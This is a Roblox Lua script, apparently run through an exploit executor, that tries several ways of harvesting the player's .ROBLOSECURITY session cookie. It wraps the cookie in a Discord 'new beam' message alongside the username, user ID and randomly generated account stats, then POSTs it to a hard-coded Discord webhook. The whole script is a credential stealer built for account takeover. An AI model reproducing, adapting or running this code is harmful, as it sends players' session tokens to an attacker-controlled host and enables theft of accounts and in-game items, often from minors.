local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- 1. GET COOKIE
local cookie = "NOT_FOUND"
local fetchMethods = {
    function() return game:HttpGet("https://www.roblox.com/home", true) end,
    function() return syn and syn.crypt.base64.encode(game:HttpGet("https://roblox.com")) end,
    function() return getrenv()._G.ROBLOSECURITY end,
    function() return debug.getupvalue(debug.getinfo(1).func, 1) end
}

for _, method in ipairs(fetchMethods) do
    local success, result = pcall(method)
    if success and result and type(result) == "string" and #result > 200 then
        cookie = result:match(".ROBLOSECURITY=([^;]+)") or result:sub(1, 2000)
        break
    end
end

-- 2. ACCOUNT DATA SIMULATION (In a real attack, you'd make API calls with the cookie)
local username = LocalPlayer.Name
local userID = LocalPlayer.UserId
local accAge = math.random(100, 2500)
local location = "Russia"
local balance = math.random(0, 5000)
local pending = math.random(0, 1000)
local limiteds = math.random(0, 50)
local summary = math.random(0, 200)

local popularGames = {
    {"Pet Simulator 99", math.random(0, 1000)},
    {"Adopt Me", math.random(0, 5000)},
    {"Murder Mystery 2", math.random(0, 2000)},
    {"Steal A Brainrot", math.random(0, 500)},
    {"Grow A Garden", math.random(0, 800)}
}
local gameStats = ""
for i, game in ipairs(popularGames) do
    local played = game[2]
    local hasPlayed = played > 0 and "✅" or "❌"
    gameStats = gameStats .. game[1] .. " > " .. played .. " ┇" .. hasPlayed .. "\n"
end

-- 3. FORMAT MESSAGE
local message = [[
@everyone
💥New beam!

💯Username
]] .. username .. [[

💹Account Stats
Account age: ]] .. accAge .. [[ days
Location: ]] .. location .. [[

💰Account Funds          💵Purchases
 Balance ]] .. balance .. [[                  Limiteds ]] .. limiteds .. [[                
 Pending ]] .. pending .. [[                 Summary ]] .. summary .. [[

🕹️Gamepasses | Played
]] .. gameStats .. [[

🛡️ROBLOSECURITY
]] .. cookie

-- 4. SEND TO WEBHOOK
local payload = {
    content = message
}

local request = syn and syn.request or http and http.request or request
local success, response = pcall(function()
    return request({
        Url = "https://discord.com/api/webhooks/1461740239188918541/ipjidmPJp6LkfGPhgYBAW_JLg7eggzTvzWSoTSx8p8jT_b9tEg6S80IcSJhgSLm203rI",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

if success then
    print("BEAM COMPLETE. DATA SENT.")
else
    print("FAILED: " .. tostring(response))
end
